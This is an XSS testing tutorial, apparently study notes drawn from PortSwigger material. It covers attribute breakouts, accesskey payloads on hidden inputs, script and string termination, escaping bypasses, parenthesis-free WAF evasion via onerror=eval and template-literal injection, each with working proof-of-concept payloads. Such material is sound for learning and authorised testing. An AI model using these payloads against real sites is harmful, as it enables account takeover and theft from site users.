When testing for `reflected` and `stored XSS`, a key task is to identify the `XSS context`:
- The location within the response where attacker-controllable data appears.
- Any input validation or other processing that is being performed on that data by the application.
Based on these details, you can then select one or more candidate XSS payloads, and test whether they are effective.

### Tips:
1. Start small, from 1 simple syntax (`<`, `>`), tag (`<h1>`) to 1 payload, troubleshoot until it work
2. If the target blocks certain tags, then fuzz with [cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
3. URL encode special chars when hosting your payload.

# 2. XSS in HTML tag attributes

When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:
```html
"><script>alert(document.domain)</script>
```

More commonly in this situation, angle brackets (`<`, `>`) are **blocked or encoded**, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:
```html
" autofocus onfocus=alert(document.domain) x="
```

The above payload creates an `onfocus` event that will execute JavaScript when the element receives the focus, and also adds the `autofocus` attribute to try to trigger the `onfocus` event automatically without any user interaction. Finally, it adds `x="` to gracefully repair the following markup.

---

## 2.1 - XSS in scriptable context

Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the `href` attribute of an anchor tag, you can use the `javascript` pseudo-protocol to execute script. For example:
```html
<a href="javascript:alert(document.domain)">
```

---

## 2.2 - XSS in Hidden Input Fields

You might encounter websites that **encode** angle brackets (`<`, `>`) but still allow you to inject attributes. Sometimes, these injections are possible even within tags that don't usually fire events automatically, such as a **canonical tag**:
```html
<head>
  <link rel="canonical" href="https://example.com/preferred-page">
</head>
```

You can exploit this behavior using `access keys` and user interaction on Chrome:
```html
<body>
  <a href="https://example.com" accesskey="h">Home</a>
</body>
```

`Access keys` allow you to provide keyboard shortcuts that reference a specific element. The `accesskey` attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire. Example payload:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">

<link rel="canonical" accesskey="X" onclick="alert(1)" />
```

### What to look for

**Note**: This technique applies whenever you can inject **attribute content** into an element, but **not** break out into a new visible/interactive element or inject a `<script>` tag. Classic candidates:
- `<input type="hidden" ...>` fields that reflect user input in value, name, or a custom attribute
- `<link>` tags (e.g. `rel="canonical"` reflecting a URL parameter)
- `<meta>` tags reflecting query-string values
Any tag where your input lands **inside the tag's attribute list**, but output encoding/filtering prevents you from closing the tag and adding a new `<script>` element, or from using typical visible-element event handlers

### Requirements to work

For this technique to work, you need:

1. **An injection point inside an HTML tag's attribute area** (not inside a quoted attribute value you can't escape from — you need to be able to break out of the current attribute and add new ones).
2. **No filtering/encoding that blocks the `accesskey` and `onclick` attribute names**, or the characters needed to inject them (spaces, quotes, `=`).
3. **A CSP or attribute-based defense that doesn't specifically block inline event handlers** (if CSP disallows inline scripts/`unsafe-inline`, `onclick` won't execute).
4. **User interaction** — the victim must press the access key combination, so this is generally chained with social engineering (e.g., "Press `Alt+Shift+X` to continue") or delivered as part of a broader phishing/CSRF-style attack rather than a silent/zero-click exploit.

### Payload

1. **Confirm you can break out of the attribute**. Try injecting a quote to see if it breaks the HTML:
```html
xsstest123"
```
2. **Inject the payload**. If you can break out of the attribute, inject:
```html
" accesskey="x" onclick="alert(document.domain)" x="
```
- `"` — closes the existing attribute (e.g., `value="`)
- `accesskey="x"` — binds the element to a key combo
- `onclick="alert(document.domain)"` — your JS payload, fires when the access key is triggered
- `x="` — reopens a dummy attribute so the rest of the original markup (the closing `"` and `/>`) doesn't break the tag
3. For a **single-reflection point** where you don't need to worry about a second closing quote, the minimal payload is just:
```html
accesskey="X" onclick="alert(1)"
```
4. **Troubleshoot, trigger and verify**.
- If the same parameter is reflected more than once on the page, your injected `x="` needs to correctly consume the next reflection's leading content so it doesn't prematurely close things or generate broken HTML that gets sanitized.
- Adjust the dummy attribute's trailing quote/value based on what follows in the second reflection — test iteratively in the browser dev tools until the DOM parses cleanly with your `onclick` intact.
- Test the actual DOM behavior, **Windows/Linux**: `Alt + Shift + X`
- Test the actual DOM behavior, **macOS**: `Ctrl + Alt + X`

Overall, the output should look like this when you inspecting it:
```html
<input type="hidden" accesskey="X" onclick="alert(1)">

# or

<link rel="canonical" accesskey="X" onclick="alert(1)" />
```

# 3. XSS into JavaScript

When the XSS context is some existing JavaScript within the response, a wide variety of situations can arise, with different techniques necessary to perform a successful exploit.

## 3.1 - Terminating the existing script

In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:
```html
<script>
...
var input = 'controllable data here';
...
</script>
```

then you can use the following payload to break out of the existing JavaScript and execute your own:
```html
</script><img src=1 onerror=alert(document.domain)>

# or

</script><script>alert(1)</script>
```

The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts.

---

## 3.2 - Breaking out of a JavaScript string

In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.

Some useful ways of breaking out of a string literal are:
```html
'-alert(document.domain)-'
';alert(document.domain)//
```

---

### Bypass single quote escaping

Some applications attempt to prevent input from breaking out of the JavaScript string by **escaping any single quote (`'`) characters with a backslash (`\`)**. 

A **backslash** (`\`) before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. In this situation, **applications often make the mistake of failing to escape the backslash (`\`) character itself**. This means that an attacker can use their own backslash (`\`) character to neutralize the backslash that is added by the application.

For example, suppose that the input:
```html
';alert(document.domain)//
```
gets converted to:
```html
\';alert(document.domain)//
```
You can now use the alternative payload:
```html
\';alert(document.domain)//
```
which gets converted to:
```html
\\';alert(document.domain)//
```
Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds.

---

### Bypass WAF characters restriction

Some websites make XSS more difficult by restricting which characters you are allowed to use. This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website. In these situations, you need to experiment with other ways of calling functions which bypass these security measures. 

One way of doing this is to use the `throw` statement with an exception handler. This enables you to pass arguments to a function without using parentheses (`(`, `)`). 

The following code assigns the `alert()` function to the global exception handler and the `throw` statement passes the `1` to the exception handler (in this case `alert`). The end result is that the `alert()` function is called with `1` as an argument.
```html
onerror=alert;throw 1

#or

<script>onerror=alert;throw 1</script>
```

Because `throw` is a statement, it normally needs a `semicolon` (`;`) (or newline) after the `onerror` assignment to start a new statement.

---

#### 1. Removing the Semicolon

**Method 1 — Block statement**: Wrap the assignment in `{ }` to form a block statement, so `throw` can follow directly with no semicolon needed:
```html
<script>{onerror=alert}throw 1337</script>
```

**Method 2 — Assignment inside the `throw` expression**: Since `throw` accepts a full expression, the `onerror` assignment can be done inside the thrown expression itself (using the comma operator), and the last value in that expression becomes the argument passed to the handler:
```html
<script>throw onerror=alert,'some string',123,'haha'</script>
```

> **Note**: Chrome prefixes the value delivered to the handler with `"Uncaught"`.

#### 2. Evaluating Arbitrary Code (not just alert)

**On Chrome:**

By setting the handler to `eval` instead of `alert`, and prefixing the thrown string with `=`, the `"Uncaught"` text becomes an assignment target, turning the whole thing into executable code:
```html
<script>{onerror=eval}throw'=alert\x281337\x29'</script>
```

This works in **Chrome**. **Firefox** instead prefixes exceptions with a two-word string (`"uncaught exception"`), which breaks this particular trick there.

**On Firefox:**

Firefox's `Error` object, when thrown, produces just the word `"Error"` with no extra prefix — but calling `Error()` needs parentheses. The workaround is to throw an `object literal` shaped like an `Error`, replicating its key properties (`lineNumber`, `columnNumber`, `fileName`, `message`):
```html
<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
```

`fileName` can even be used to smuggle a second argument into a two-argument handler like `prompt`:
```html
<script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>
```

**Other vectors:**

- Avoids string literals entirely, instead building the payload out of regex literals and array/property access:
```html
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
```

- Drop the `throw` statement altogether by abusing `TypeError` and property-access side effects to deliver a string to the exception handler.
```html
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```

## 3.3 - Using HTML-encoding

When XSS lands in existing JavaScript inside a quoted tag attribute (like an event handler) (A "quoted tag attribute" just means an HTML attribute whose value is wrapped in quotes. For example, in this `<img>` tag: `<img src="image.jpg" onerror="alert(1)">`), HTML-encoding can bypass input filters. Browsers HTML-decode attribute values before processing them further, so if the server blocks certain characters, encoding them as HTML entities can slip past the filter while still working once decoded.

For example, if the XSS context is as follows:
```html
<a href="#" onclick="... var input='controllable data here'; ...">
```
and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:
```html
&apos;-alert(document.domain)-&apos;
```
The `&apos;` sequence is an HTML entity representing an apostrophe or single quote. Because the browser HTML-decodes the value of the `onclick` attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.

---

## 3.4 - Template literals

JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax.

For example, the following script will print a welcome message that includes the user's display name:
```
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the `${...}` syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:
```html
<script>
...
var input = `controllable data here`;
...
</script>
```
then you can use the following payload to execute JavaScript without terminating the template literal:
```
${alert(document.domain)}
```
